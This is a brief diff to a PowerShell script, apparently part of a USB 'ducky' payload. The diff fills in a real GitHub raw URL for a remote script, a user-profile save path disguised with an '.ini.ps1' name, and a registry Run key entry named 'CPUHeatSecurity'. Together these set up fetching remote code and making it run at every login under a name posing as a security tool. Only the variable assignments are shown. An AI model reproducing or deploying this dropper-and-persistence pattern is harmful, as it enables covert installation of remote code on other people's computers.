@@ -1,5 +1,5 @@
-$githubUrl = "https://raw.githubusercontent.com/NomUtilisateur/NomRepo/master/monscript.ps1"
-$destinationPath = "C:\Chemin\Vers\Le\Fichier\CPUHeatSecutity.ps1"
+$githubUrl = "https://raw.githubusercontent.com/Gamoboy/ducky/master/CPUHeatSecurity.ps1"
+$destinationPath = "$env:USERPROFILE\CPUHeatSecutity.ini.ps1"
 $autorunRegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $autorunRegistryName = "CPUHeatSecurity"
 
